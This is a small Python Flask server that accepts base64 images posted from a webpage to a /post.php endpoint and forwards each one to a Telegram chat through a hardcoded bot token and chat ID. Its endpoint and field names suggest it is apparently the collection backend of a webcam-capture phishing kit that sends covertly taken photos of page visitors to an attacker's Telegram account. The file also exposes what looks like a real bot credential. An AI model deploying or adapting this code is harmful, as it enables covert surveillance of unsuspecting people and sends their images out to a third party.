# server.py

import base64
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Your Telegram bot config
BOT_TOKEN = "8495721751:AAFSMzTZIVP9KN3TrX7I69X-DEnpWJ49fPU"
CHAT_ID = "7029973694"  # CPTGL chat

TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"


@app.route("/post.php", methods=["POST"])
def receive_image():
    """
    Receives base64 image from the webpage (field: 'cat')
    and forwards it to your Telegram bot chat.
    """
    try:
        img_data = request.form.get("cat")

        if not img_data:
            return jsonify({"status": "error", "message": "No image received"}), 400

        # Strip "data:image/png;base64," if present
        if "," in img_data:
            img_data = img_data.split(",", 1)[1]

        # Decode base64 to bytes
        image_bytes = base64.b64decode(img_data)

        # Send to Telegram
        files = {"photo": ("image.png", image_bytes)}
        data = {"chat_id": CHAT_ID}

        tg_response = requests.post(TELEGRAM_URL, data=data, files=files)

        try:
            tg_json = tg_response.json()
        except Exception:
            tg_json = {"raw_text": tg_response.text}

        return jsonify({
            "status": "ok",
            "telegram_status_code": tg_response.status_code,
            "telegram_response": tg_json
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
